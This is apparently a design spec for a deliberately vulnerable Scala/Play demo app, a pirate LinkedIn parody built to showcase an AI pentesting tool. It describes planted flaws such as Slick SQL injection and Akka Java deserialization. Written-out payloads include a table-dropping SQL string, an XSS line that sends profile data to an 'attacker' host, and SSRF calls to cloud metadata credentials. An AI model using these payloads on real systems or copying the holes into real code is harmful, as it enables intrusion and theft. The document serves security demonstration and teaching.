# Plundr
### LinkedIn for pirates. Endorse the boarding skills. Recruit a crew. Get plundered.

## Premise & Vibe

Plundr be the premier professional network for the freebootin' set. Captains post crew listings ("Need 3 powder monkeys, must supply own match-cord"), deckhands list their pillage history ("Q3 2719: led successful boarding of the *Santa Lucia*, 14% YoY booty growth"), and shipmates endorse each other for skills like *Boarding*, *Cannon Care*, *Navigation by Stars*, *Grog Tolerance*, and *Parley*.

Recruiters from rival flotillas browse profiles, send "InScroll" messages, and shortlist sea-worthy candidates. There's a feed of cargo manifests, a "People You May Have Marooned" widget, and a premium tier (Plundr Captain) that gets ye who-viewed-yer-profile analytics.

The vibe is corporate-LinkedIn-cosplay-but-pirates. The codebase is a real Scala 3 / Play Framework 3 web app with a `scalajs-react` SPA, a Slick data layer, and an Akka cluster. The bugs are the kinds of bugs Scala/JVM shops actually ship in production, dressed up in tricorn hats. Spec stays technical from here.

## Why This Stack

Scala/Play is a deliberate choice. Most pentest demo apps are Node, Python, or Go; defenders and offensive testers alike rarely have muscle memory for the JVM ecosystem. That makes Plundr a high-value showcase for Apex's whitebox capabilities:

- **sbt project graph** is non-trivial. Apex must read `build.sbt`, `project/plugins.sbt`, and `project/Dependencies.scala` to enumerate the dependency tree, including transitive Akka modules.
- **Slick's `sql"..."` interpolator** has a sharp edge: `${expr}` is parameterized, but `#${expr}` splices raw text. Static analysis must distinguish these two interpolator forms. This is the kind of language-aware detection that string-grep tools miss.
- **Akka actors and serialization** introduce bug classes that don't exist in request/response frameworks: actor message ordering, cluster gossip exposure, and deserialization gadgets via `JavaSerializer`. Apex's reasoning loop has to model "actor receives message of type T, deserializes T, T extends Serializable" as a chain.
- **Play's filter pipeline** for CSRF/CORS/security headers is configured imperatively in `Filters.scala` and declaratively via `application.conf`. Apex needs both source and config context to spot exclusions.
- **Twirl templates** (`@Html(...)`) bypass HTML escaping. Detecting this requires template-aware parsing.

The novelty of Scala/Play in a demo also means the recording will land with audiences (JVM shops, fintech, telco, gov) that don't see themselves in the usual Express.js demo lineup.

## Stack Details

| Layer | Choice | Version | Notes |
|---|---|---|---|
| Language | Scala | 3.4.2 | Scala 3 syntax; some legacy 2.13 modules pinned |
| Web framework | Play Framework | 3.0.5 | Pekko-based fork of Play 2.9 |
| HTTP server | Akka HTTP | 10.5.3 | Behind Play; also exposed directly for one internal endpoint |
| Actor system | Akka | 2.8.5 | Classic + Typed mixed; cluster enabled |
| Database | PostgreSQL | 16.2 | Single primary, no replica in demo |
| ORM/DB layer | Slick | 3.5.1 | Plain `sql"..."` and `TableQuery` mixed |
| Frontend | scalajs-react | 2.1.1 | SPA served from `/`; bundled via `scalajs-bundler` |
| Build | sbt | 1.10.0 | Multi-project build: `core`, `web`, `worker`, `protocol` |
| Auth | Custom JWT | jjwt 0.12.x | HS256, secret in `application.conf` |
| Templating | Twirl | 2.0.x | Used for transactional emails and a small server-rendered admin UI |
| HTTP client | Play WSClient | 3.0.x | Used for "import crew from URL" feature |
| Container | Docker | - | `sbt-native-packager` produces a fat-jar image |
| Orchestration | docker-compose | - | Demo runs on a single host; cluster simulated with two app containers |

Project layout:

```
plundr/
  build.sbt
  project/
    Dependencies.scala
    plugins.sbt
  modules/
    protocol/        # shared case classes, akka serializers
    core/            # domain, slick repos, services
    web/             # Play app, controllers, twirl templates
    worker/          # akka cluster worker node
  ui/                # scalajs-react SPA
  conf/
    application.conf
    routes
    logback.xml
  docker/
    Dockerfile
    docker-compose.yml
```

## Architecture

Two JVM nodes form a small Akka cluster:

- **`web` node**: Runs Play Framework. Serves the scalajs-react SPA at `/`, JSON API under `/api`, Twirl-rendered admin UI under `/admin`. Hosts a `UserActor` and `ProfileActor` per online user. Exposes Akka remoting on port 2551.
- **`worker` node**: Runs background jobs - profile import, endorsement aggregation, "who viewed your scroll" analytics, email digests. Subscribes to cluster events. Exposes Akka remoting on port 2552.

PostgreSQL sits behind both nodes. Slick connection pool is HikariCP. A single Redis instance caches session lookups and rate-limit counters (not security-relevant for the demo).

Request flow for a typical API call:

1. Browser hits `https://plundr.local/api/profile/123`.
2. Play `Filters.scala` chain runs: `SecurityHeadersFilter`, `CSRFFilter` (with exclusions), `LoggingFilter`.
3. `ProfileController.get(id)` handler resolves a JWT from the `Authorization` header via `AuthAction`.
4. Controller asks `ProfileService`, which queries `ProfileRepo` (Slick).
5. For some endpoints, controller `ask`s a `ProfileActor` over the cluster; reply is serialized via Akka serialization.
6. Response JSON is built with Play's `Json.toJson` (Play-JSON, not circe).

The scalajs-react SPA is a thin client: it fetches JSON, renders profiles, and posts forms. Server-rendered Twirl is used for `/admin/*` and for the public profile share page (SEO/preview).

## Data Model

PostgreSQL schema (abbreviated; foreign keys omitted for brevity).

```sql
CREATE TABLE pirates (
  id            BIGSERIAL PRIMARY KEY,
  handle        TEXT UNIQUE NOT NULL,           -- e.g. "@blackbeard"
  display_name  TEXT NOT NULL,
  bio           TEXT,                            -- raw HTML allowed (intentional)
  email         TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,                   -- MD5 hex (intentional)
  role          TEXT NOT NULL DEFAULT 'crew',    -- 'crew' | 'captain' | 'admiral'
  created_at    TIMESTAMPTZ NOT NULL DEFAULT now(),
  premium       BOOLEAN NOT NULL DEFAULT false
);

CREATE TABLE ships (
  id           BIGSERIAL PRIMARY KEY,
  name         TEXT NOT NULL,
  flag         TEXT,
  captain_id   BIGINT REFERENCES pirates(id),
  tonnage      INT,
  created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE crew_listings (
  id           BIGSERIAL PRIMARY KEY,
  ship_id      BIGINT NOT NULL,
  title        TEXT NOT NULL,                    -- "Powder Monkey, 3 berths"
  description  TEXT,
  pay_share    NUMERIC(5,2),
  created_by   BIGINT NOT NULL,
  created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE endorsements (
  id            BIGSERIAL PRIMARY KEY,
  endorser_id   BIGINT NOT NULL,
  endorsee_id   BIGINT NOT NULL,
  skill         TEXT NOT NULL,                    -- "boarding", "cannon-care"
  weight        INT  NOT NULL DEFAULT 1,
  created_at    TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE pillage_history (
  id            BIGSERIAL PRIMARY KEY,
  pirate_id     BIGINT NOT NULL,
  vessel_taken  TEXT NOT NULL,
  date_taken    DATE NOT NULL,
  loot_value    NUMERIC(12,2),
  notes         TEXT
);

CREATE TABLE scroll_messages (
  id          BIGSERIAL PRIMARY KEY,
  sender_id   BIGINT NOT NULL,
  recipient_id BIGINT NOT NULL,
  body        TEXT NOT NULL,
  read_at     TIMESTAMPTZ
);

CREATE TABLE sessions (
  jti         UUID PRIMARY KEY,
  pirate_id   BIGINT NOT NULL,
  issued_at   TIMESTAMPTZ NOT NULL,
  expires_at  TIMESTAMPTZ NOT NULL,
  revoked     BOOLEAN NOT NULL DEFAULT false
);
```

Scala domain (`modules/core/src/main/scala/plundr/domain/Models.scala`):

```scala
final case class Pirate(
  id: Long,
  handle: String,
  displayName: String,
  bio: Option[String],
  email: String,
  passwordHash: String,
  role: String,
  premium: Boolean,
  createdAt: Instant
) derives Reads, Writes

final case class Endorsement(id: Long, endorserId: Long, endorseeId: Long, skill: String, weight: Int)
```

Akka protocol (`modules/protocol/src/main/scala/plundr/protocol/Messages.scala`):

```scala
sealed trait ProfileCommand
final case class GetProfile(id: Long) extends ProfileCommand
final case class UpdateBio(id: Long, bio: String) extends ProfileCommand
final case class ImportCrewFromUrl(url: String, requester: Long) extends ProfileCommand

// Java-serialized (intentional)
final case class LegacyProfileSnapshot(payload: java.util.HashMap[String, AnyRef])
  extends java.io.Serializable
```

## Key Routes / Surfaces

`conf/routes`:

| Method | Path | Controller | Notes |
|---|---|---|---|
| GET | `/` | `Assets.versioned` | scalajs-react SPA shell |
| POST | `/auth/signup` | `AuthController.signup` | Creates pirate; MD5 password |
| POST | `/auth/login` | `AuthController.login` | Returns JWT |
| POST | `/auth/logout` | `AuthController.logout` | Revokes JTI |
| GET | `/api/profile/:id` | `ProfileController.get` | Public profile JSON |
| POST | `/api/profile` | `ProfileController.create` | Mass assignment risk |
| PUT | `/api/profile/:id` | `ProfileController.update` | Mass assignment risk |
| GET | `/api/search` | `SearchController.search` | Slick raw SQL |
| POST | `/api/endorse` | `EndorsementController.add` | |
| GET | `/api/endorsements/:id` | `EndorsementController.list` | |
| POST | `/api/scroll` | `ScrollController.send` | InScroll messages |
| POST | `/api/crew/import` | `CrewController.importFromUrl` | SSRF risk |
| POST | `/api/listings` | `ListingController.create` | CSRF excluded |
| PUT | `/api/listings/:id` | `ListingController.update` | CSRF excluded |
| GET | `/admin` | `AdminController.dashboard` | Twirl, role check |
| GET | `/admin/users` | `AdminController.users` | Twirl |
| GET | `/share/:handle` | `PublicController.share` | Twirl, `@Html(bio)` |
| GET | `/internal/akka-http/health` | direct Akka HTTP route | bound to `0.0.0.0` |
| GET | `/@dev` | Play dev-mode page | Should be off in prod |

Akka cluster ports (not in `routes`):

| Port | Purpose |
|---|---|
| 2551 | `web` node remoting / gossip |
| 2552 | `worker` node remoting / gossip |
| 8558 | Akka Management HTTP (cluster bootstrap) |

## Auth Model

JWT bearer tokens, HS256.

- Signup hashes the password with `MessageDigest.getInstance("MD5")` and stores the hex string. No salt. No iterations.
- Login compares MD5 hex; on success, mints a JWT with claims `{ sub: pirateId, role, jti, iat, exp }`. TTL is 30 days.
- Secret is read from `play.http.secret.key` in `conf/application.conf`. Same value is used to sign JWTs. The conf file is included in the deployable artifact.
- `AuthAction` is a Play `ActionFunction` that parses the `Authorization: Bearer <token>` header, verifies the JWT, looks up `sessions.revoked`, and attaches a `Pirate` to the request.
- Roles: `crew` (default), `captain` (can post listings), `admiral` (admin). Role is a string column, checked in controllers via `if (req.pirate.role == "admiral")`.
- Premium status is a separate boolean and gates analytics endpoints.

CSRF protection is on for browser endpoints under `/admin` and the SPA's auth flows, but disabled for `/api/*` via a Play filter exclusion (see vulnerabilities).

## Intentional Vulnerabilities

Twelve seeded bugs, plus a couple of cherries. Severity uses CVSS 3.1 vectors.

| # | Severity | Class | Location | One-line |
|---|---|---|---|---|
| 1 | Critical | SQL injection (Slick raw SQL) | `core/.../SearchRepo.scala` | `sql"...#${q}..."` splices raw user input |
| 2 | Critical | Insecure deserialization | `protocol/.../Messages.scala` + `application.conf` | Akka `JavaSerializer` enabled for `LegacyProfileSnapshot` |
| 3 | Critical | Akka cluster port exposed | `docker-compose.yml` + `application.conf` | Port 2551 bound to `0.0.0.0`, no `secure-cookie` |
| 4 | Critical | Hardcoded JWT secret | `conf/application.conf` | `play.http.secret.key` checked into git, shipped in jar |
| 5 | High | Mass assignment | `web/.../ProfileController.scala` | `form.bindFromRequest()` on case class with `role` |
| 6 | High | SSRF | `web/.../CrewController.scala` | `WSClient.url(userUrl).get()` no allowlist |
| 7 | High | CSRF disabled on API | `web/.../Filters.scala` + conf | `play.filters.csrf.bypassCorsTrustedOrigins=true`, path exclusion |
| 8 | High | Stored XSS | `web/.../views/share.scala.html` | `@Html(pirate.bio)` in Twirl |
| 9 | Medium | Weak password hashing | `core/.../AuthService.scala` | MD5, no salt, no iterations |
| 10 | Medium | Play dev mode in prod | `Dockerfile` | `-Dplay.mode=Dev` left in `CMD` |
| 11 | Medium | IDOR on scroll messages | `web/.../ScrollController.scala` | `GET /api/scroll/:id` returns by id, no owner check |
| 12 | Low | Verbose error responses | `web/.../ErrorHandler.scala` | Stack traces returned to client when `Accept: application/json` |
| 13 | Low | Internal Akka HTTP exposed | `web/.../InternalRoutes.scala` | `/internal/akka-http/health` reveals cluster members |

### Critical

**1. SQL injection via Slick raw SQL splice**

`SearchRepo.searchPirates` builds a query for the recruiter search:

```scala
def searchPirates(skill: String, sort: String): DBIO[Seq[Pirate]] =
  sql"""
    SELECT * FROM pirates p
    JOIN endorsements e ON e.endorsee_id = p.id
    WHERE e.skill = $skill
    ORDER BY #${sort}
    LIMIT 50
  """.as[Pirate]
```

The `$skill` interpolation is correctly parameterized. The `#${sort}` form splices the raw string into the SQL. The `sort` param comes from `?sort=` on the request and is passed in unchecked. Payload: `?sort=created_at; DROP TABLE sessions; --` for stacked statements (Postgres allows multiple statements when using `executeUpdate`-equivalents; for `as[]` it's a single-statement context but `UNION SELECT` exfiltration still works). Apex should call out the difference between `${}` (parameterized) and `#${}` (raw splice).

Real-world parallel: the Slick docs explicitly warn about `#$` (sometimes called the "splice interpolator"). Many Scala shops have shipped this; see the recurring "Slick SQL injection" topic on the Slick GitHub issue tracker and the 2019 Scalac article on Slick safety.

**2. Insecure deserialization via Akka `JavaSerializer`**

`application.conf`:

```hocon
akka.actor {
  allow-java-serialization = on
  warn-about-java-serializer-usage = off
  serialization-bindings {
    "plundr.protocol.LegacyProfileSnapshot" = java
  }
}
```

`LegacyProfileSnapshot` is sent over the cluster when a worker imports legacy profile data. An attacker who can reach port 2551 (see #3) can craft a malicious serialized payload using a known gadget chain (e.g., `commons-collections`, present transitively via Apache POI used for CSV export). Result: RCE on both `web` and `worker` nodes.

Real-world parallel: CVE-2017-9805 (Struts 2 OGNL), CVE-2015-7501 (commons-collections gadget), and specifically Akka's own advisory pattern around Java serialization (see Akka 2.6 release notes and the Lightbend security guidance to disable `allow-java-serialization`).

**3. Akka cluster gossip port exposed publicly**

`docker-compose.yml`:

```yaml
services:
  web:
    ports:
      - "9000:9000"
      - "2551:2551"     # remoting, intentionally exposed
      - "8558:8558"     # akka management
```

`application.conf`:

```hocon
akka.remote.artery {
  canonical.hostname = "0.0.0.0"
  canonical.port = 2551
}
```

There's no `akka.remote.artery.ssl.config-ssl-engine` and no `akka-cluster.secure-cookie`. Anyone who can route to the host can join the cluster as a peer and start sending messages. Combine with #2 for RCE.

Real-world parallel: CVE-2021-23339 (Akka HTTP header injection) and the broader pattern documented by Lightbend and various pentest writeups about Akka cluster exposure (e.g., "Akka cluster on the public internet" - common misconfiguration in Kubernetes deployments where `2551` ends up on a `LoadBalancer` service).

**4. Hardcoded JWT secret in `application.conf`**

```hocon
play.http.secret.key = "yarrr-this-be-a-secret-2719-edition-do-not-share"
plundr.jwt.secret = ${play.http.secret.key}
```

The same key signs Play's session cookie and Plundr JWTs. The file is committed to git (visible in `.git` if exposed via misconfigured nginx) and included in the deployed jar's `conf/` directory. An attacker who reads the jar (e.g., from a public S3 bucket, container registry, or via path traversal) can mint arbitrary JWTs.

Real-world parallel: Play documentation warns to override `play.http.secret.key` via env var. The 2018 Lightbend security advisory and countless GitHub leaks (search "play.http.secret.key" on GitHub - thousands of hits).

### High

**5. Mass assignment via Play form binding**

```scala
val pirateForm: Form[Pirate] = Form(
  mapping(
    "id" -> longNumber,
    "handle" -> nonEmptyText,
    "displayName" -> nonEmptyText,
    "bio" -> optional(text),
    "email" -> email,
    "passwordHash" -> text,
    "role" -> text,
    "premium" -> boolean,
    "createdAt" -> ignored(Instant.now())
  )(Pirate.apply)(p => Some((p.id, p.handle, p.displayName, p.bio, p.email, p.passwordHash, p.role, p.premium, p.createdAt)))
)

def update(id: Long) = AuthAction.async { implicit req =>
  pirateForm.bindFromRequest().fold(
    err => Future.successful(BadRequest(err.errorsAsJson)),
    pirate => repo.update(pirate.copy(id = id)).map(_ => Ok)
  )
}
```

A `crew` user submits `role=admiral&premium=true` and is upgraded.

Real-world parallel: GitHub 2012 mass assignment ("homakov" Rails bug). The pattern is identical in Play Form binding when developers expose the full case class.

**6. SSRF in "import crew from URL"**

```scala
def importFromUrl(): Action[JsValue] = AuthAction.async(parse.json) { req =>
  val url = (req.body \ "url").as[String]
  ws.url(url).get().map { resp =>
    parser.parseCrew(resp.body) match {
      case Right(crew) => Ok(Json.toJson(crew))
      case Left(err)   => BadRequest(err)
    }
  }
}
```

No allowlist, no scheme check, no DNS pinning. Reach `http://169.254.169.254/latest/meta-data/iam/security-credentials/` on AWS, `http://localhost:8558/cluster/members` for Akka management, or internal services.

Real-world parallel: Capital One 2019 (CVE-2019-12491-adjacent SSRF via WAF). HackerOne SSRF reports on Shopify, GitLab, etc.

**7. CSRF disabled on `/api` endpoints via filter exclusion**

```scala
class Filters @Inject() (csrf: CSRFFilter, sec: SecurityHeadersFilter) extends HttpFilters {
  override val filters = Seq(sec, csrf)
}
```

```hocon
play.filters.csrf {
  bypassCorsTrustedOrigins = true
  header.bypassHeaders {
    X-Requested-With = "*"
  }
  routeModifiers.whiteList = ["nocsrf", "api"]
}
```

Combined with `+ nocsrf` modifiers liberally tagged on `/api/*` routes:

```
+ nocsrf
POST  /api/listings              controllers.ListingController.create()
+ nocsrf
PUT   /api/listings/:id          controllers.ListingController.update(id: Long)
```

A SameSite=Lax cookie still gets sent on top-level `POST` from `evil.tld` because the JWT is read from `Authorization` header *or* a fallback `plundr_token` cookie. Plus, `bypassHeaders` lets any request with `X-Requested-With: anything` skip CSRF entirely.

Real-world parallel: Play's own docs note the foot-gun. CVE-2014-3630 was Play's earlier CSRF default-off issue.

**8. Stored XSS in pirate bio rendered with `@Html()`**

`views/share.scala.html`:

```
@(pirate: Pirate)
<!DOCTYPE html>
<html><head><title>@pirate.displayName on Plundr</title></head>
<body>
  <h1>@pirate.displayName</h1>
  <div class="bio">@Html(pirate.bio.getOrElse(""))</div>
</body></html>
```

Bio is user-controlled, stored as raw text, rendered with `@Html` which marks it as safe and skips Twirl's default escaping. Payload: `<img src=x onerror=fetch('/api/profile/me').then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker/',JSON.stringify(d)))>`.

Real-world parallel: every LinkedIn/Facebook stored XSS in profile fields ever filed on HackerOne. LinkedIn paid out for CVE-2018-1003-style profile XSS.

### Medium

**9. Weak password hashing: MD5, no salt**

```scala
def hash(pw: String): String = {
  val md = java.security.MessageDigest.getInstance("MD5")
  md.digest(pw.getBytes("UTF-8")).map("%02x".format(_)).mkString
}
```

Rainbow-table-trivial. Combined with #1, attacker dumps `pirates` and recovers passwords offline.

Real-world parallel: LinkedIn 2012 breach (unsalted SHA-1, similar class). Adobe 2013 (3DES with no salt-equivalent).

**10. Play dev mode in production**

`Dockerfile`:

```
CMD ["bin/plundr", "-Dplay.mode=Dev", "-Dplay.http.secret.key=$PLAY_SECRET"]
```

The `-Dplay.mode=Dev` flag was left in from local testing. Dev mode disables some security defaults, enables the `@dev` diagnostic page, shows full stack traces on every error, and disables HTTPS redirect.

Real-world parallel: Spring Boot Actuator exposed in prod (CVE-2022-22965-adjacent misconfigurations). Django `DEBUG=True` in prod is the canonical example.

**11. IDOR on scroll messages**

```scala
def get(id: Long) = AuthAction.async { req =>
  scrollRepo.findById(id).map {
    case Some(msg) => Ok(Json.toJson(msg))
    case None      => NotFound
  }
}
```

No check that `msg.recipientId == req.pirate.id` or `msg.senderId == req.pirate.id`. Iterate `id`, read everyone's InScrolls.

Real-world parallel: HackerOne's IDOR reports against Twitter DMs, LinkedIn InMail, etc.

### Low

**12. Verbose error responses**

`ErrorHandler.scala` returns the full `Throwable.getStackTrace` as JSON when `Accept: application/json` is set, including class names from `plundr.*`, Slick query strings, and Akka actor paths. Aids exploitation of #1, #2.

**13. Internal Akka HTTP route exposed**

A direct Akka HTTP binding (separate from Play) listens on `0.0.0.0:9001` for `/internal/akka-http/health` and returns `{ "members": [...], "version": "2.8.5", "leader": "akka://plundr@web:2551" }`. Reveals cluster topology and exact Akka version for #3.

## Real-World Parallels

- **LinkedIn 2012**: 6.5M unsalted SHA-1 hashes leaked. Plundr's MD5 is the spiritual successor.
- **Slick `#$` foot-gun**: The Slick documentation has an explicit warning, and the issue recurs every few years on Scala mailing lists. Apache Spark's Slick-using projects have been patched for similar issues.
- **Akka cluster exposure**: Multiple consultancy writeups (Lightbend, NCC Group) document Kubernetes deployments where `Service` of type `LoadBalancer` accidentally exposes 2551. Combined with `allow-java-serialization`, this is a path to RCE that's been demonstrated publicly (see ekoparty 2019 and DEF CON 28 talks on JVM-cluster attacks).
- **Mass assignment (homakov, 2012)**: Egor Homakov's GitHub commit-as-anyone bug. Same root cause, different language.
- **Capital One 2019**: SSRF to AWS metadata, 100M+ records. Plundr's `/api/crew/import` is the same primitive.
- **GitHub `play.http.secret.key` leaks**: Searching public GitHub for that string returns thousands of repos. Plundr ships one in the artifact.
- **CVE-2021-23339**: Akka HTTP header injection. Cited as the family of bug Plundr's cluster exposure invites.
- **Rails YAML deserialization (CVE-2013-0156)**, **Struts 2 (CVE-2017-9805)**: Insecure deserialization on the JVM, same gadget-chain pattern as Plundr's Akka case.

## Apex Features Showcased

- **Whitebox Scala/JVM ingestion**: Apex reads `build.sbt`, `project/Dependencies.scala`, and `project/plugins.sbt` to enumerate the dep graph including transitive `commons-collections`. Bonus: detects `sbt-native-packager` and infers Docker layout.
- **Slick interpolator awareness**: Distinguishes `${}` (safe) from `#${}` (raw splice). Reports finding #1 with exact line and a remediation rewrite using `SQLActionBuilder.+()` or `Compiled` queries.
- **Akka actor abuse reasoning**: From `application.conf` `serialization-bindings` plus `LegacyProfileSnapshot extends Serializable`, Apex reasons that any path that constructs and `tell`s this message is reachable for deserialization gadgets. Cross-references with port exposure from `docker-compose.yml`.
- **Play filter analysis**: Parses `Filters.scala`, `application.conf` `play.filters.*`, and `routes` modifier `+ nocsrf` to produce a per-route CSRF posture table.
- **Twirl template parsing**: Detects `@Html(...)` calls with non-literal arguments and traces back to the data source (DB column).
- **Config + secret detection**: Flags `play.http.secret.key` as inline literal, not env reference. Cross-references `Dockerfile` `CMD` for `-Dplay.mode=Dev`.
- **Blackbox /pentest mode**: Discovers `/api/*`, `/admin/*`, `/internal/akka-http/health`, `/@dev`. JS endpoint extraction parses the scalajs-react bundle's split chunks for additional API paths (`scala.js` minification still leaves recognizable string constants).
- **Attack-surface map**: Two services, three remoting ports (2551, 2552, 8558), plus 9000 (Play), 9001 (internal Akka HTTP). Apex maps and prioritizes.
- **Patching agent**: Generates fixes - `MessageDigest.getInstance("Argon2id")` via `de.mkammerer:argon2-jvm`, replace `#${sort}` with allowlist enum, switch to `akka.actor.serializers.proto`/CBOR and remove `allow-java-serialization`.
- **Judge + CVSS**: Judge double-checks the SQLi finding by simulating a payload against a sandbox copy of the Postgres schema; assigns CVSS 9.8 to #1 and #4.
- **Memory**: Across episodes, Apex remembers that JVM/Play targets often hide secrets in `application.conf` and proactively `cat`s it.
- **Threat-model agent**: Builds a STRIDE diagram showing repudiation via the IDOR scroll endpoint and information-disclosure via verbose errors.

## Demo Storyline

Roughly 12-14 minutes of recording, edited to ~8 minutes.

1. **Cold open (00:00-00:30)**: Tour of Plundr the product. Sign up as `@scurvyjake`, post a profile, endorse `@blackbeard` for boarding. Recruiter joke. Land on the punchline: "Now let's plunder the plunder app."
2. **Apex /pentest blackbox phase (00:30-02:30)**: Point Apex at `https://plundr.local`. It crawls, extracts JS endpoints from the scalajs-react bundle, finds `/internal/akka-http/health`, learns it's Akka 2.8.5. Akka cluster ports flagged from a port scan via Kali integration.
3. **Whitebox handoff (02:30-04:00)**: Provide source. Apex parses sbt graph, flags `commons-collections` transitive, reads `application.conf`, spots `allow-java-serialization=on` and the hardcoded secret. Operator narrates.
4. **Slick SQLi deep dive (04:00-05:30)**: Apex finds `SearchRepo.searchPirates`, distinguishes `$skill` from `#${sort}`, generates a UNION-based payload, demonstrates exfil of `password_hash` (MD5 hashes), cracks one with hashcat (offline, pre-recorded for time).
5. **JWT forgery (05:30-06:30)**: With the secret from `application.conf`, Apex forges an `admiral` JWT. Hits `/admin/users`. Mass assignment chain: also demonstrate elevating `@scurvyjake` from `crew` to `admiral` via PUT.
6. **Akka cluster RCE (06:30-08:30)**: Apex's swarm spawns a sub-agent that builds a malicious `LegacyProfileSnapshot` with a commons-collections gadget, sends it to port 2551, lands a reverse shell on the worker node. (Sandbox; explicit framing that this requires reachable port.)
7. **XSS + IDOR + SSRF montage (08:30-10:00)**: Stored XSS in bio steals admiral session. SSRF in `/api/crew/import` to `http://169.254.169.254/latest/meta-data/`. IDOR on InScroll messages reads the captain's DMs.
8. **Patching agent (10:00-11:30)**: Apex generates a PR. Replaces MD5 with Argon2id, swaps `#${sort}` for an enum allowlist, disables Java serialization, moves secrets to env vars, adds CSRF to `/api/*`, scopes Twirl `@Html` to a sanitized HTML AST. Runs `sbt test`, all green.
9. **Findings report + CVSS (11:30-13:00)**: Final findings table. Judge has signed off. Memory-pinned: "Scala/Play targets - check `application.conf` and `#${...}` first."
10. **Outro (13:00-end)**: "Plundr be plundered. Next week: a different doomed startup."

## Build Notes

3-5 days of work for one engineer comfortable with Scala.

**Day 1**: Scaffold sbt multi-project (`protocol`, `core`, `web`, `worker`). Set up Play 3, Slick, Postgres in docker-compose. Get the SPA dev loop running with `scalajs-bundler`. Define schema, Slick `TableQuery` definitions, basic auth flow (signup/login with the intentional MD5).

**Day 2**: Build the SPA - profile page, search, endorsements, listings, scroll messages. Wire `ProfileController`, `SearchController`, `EndorsementController`. Plant vulns #1 (Slick `#${}`), #5 (mass assignment), #11 (IDOR). Twirl `share.scala.html` for the public profile.

**Day 3**: Akka cluster wiring. `web` and `worker` nodes, classic actors. `ProfileActor`, `ImportWorker`. Add `LegacyProfileSnapshot` and the Java-serialization binding (#2). Wire `/api/crew/import` (#6). Configure `application.conf` with the hardcoded secret (#4) and bind cluster to `0.0.0.0` (#3).

**Day 4**: Filters, CSRF, error handler. Plant #7 (CSRF exclusions), #8 (Twirl `@Html`), #12 (verbose errors), #13 (Akka HTTP internal). Dockerfile with `-Dplay.mode=Dev` (#10). Seed data: 50 pirate profiles, ships, endorsements with maritime puns.

**Day 5**: End-to-end QA. Verify each vulnerability is reachable and exploitable. Test the swarm path for the deserialization chain (sandbox-only). Polish UI copy. Pre-record any slow steps (hashcat). Write a teardown script.

**Risks to watch**:
- Akka cluster bootstrap is finicky on Docker bridge networks. Use static seed nodes.
- scalajs-react bundle sizes are large; demo loads might be slow without splitting. Keep one demo profile cached.
- Java serialization gadget chains are fragile across JVM versions. Pin to `eclipse-temurin:17-jre` and a known `commons-collections` version (3.2.1).
- MD5 + JWT secret leak: don't accidentally use a real-looking secret that matches anything in production memory.

**Out-of-scope cherries** (do not add unless time):
- A "premium" tier upgrade race condition.
- An XXE in an OPML import (different tone).
- Path traversal in `/share/:handle` if `handle` contains slashes.

## Recording Notes

- **Aspect**: 1080p, 60fps screencap of the Apex CLI on the left, browser/Plundr on the right, terminal for ad-hoc commands at the bottom-right.
- **Color**: Plundr's UI uses navy/cream/brass. Apex's TUI default theme contrasts well; do not change.
- **Cuts**: Real Apex run takes ~25-40 min depending on swarm parallelism. Cut to the highlight findings; show full Apex output for the Slick SQLi (the diff between `${}` and `#${}` is the educational moment) and for the Akka deserialization (most novel finding).
- **Voiceover beats**:
  - "Plundr is a Scala 3 / Play 3 app. Most pentest tooling has no idea what to do with this stack."
  - "Apex reads `build.sbt`, not just routes."
  - "Watch this: Slick's `${}` is safe, `#${}` is not. Apex catches the difference."
  - "The Akka cluster gossip port is on the public internet. With Java serialization on, that's RCE."
  - "Patching agent regenerates the diff. `sbt test` is green."
- **Captions**: Show the exact CVSS vector strings on screen for each finding. Pin file paths in the bottom-left when Apex narrates a finding.
- **Audio**: Light maritime ambiance under the cold open only. Mute under technical sections.
- **Disclaimers**: Lower-third on first vuln: "Targets and bugs are intentional. Do not run against systems you don't own." Repeat on the RCE segment.
- **Thumbnail**: Plundr logo (skull in a tricorn made of corporate-blue letters) with a tear of red across it. Title: "Plundr Got Plundered."
- **End card**: "Apex - the AI pentester. Next demo: [TBD]."
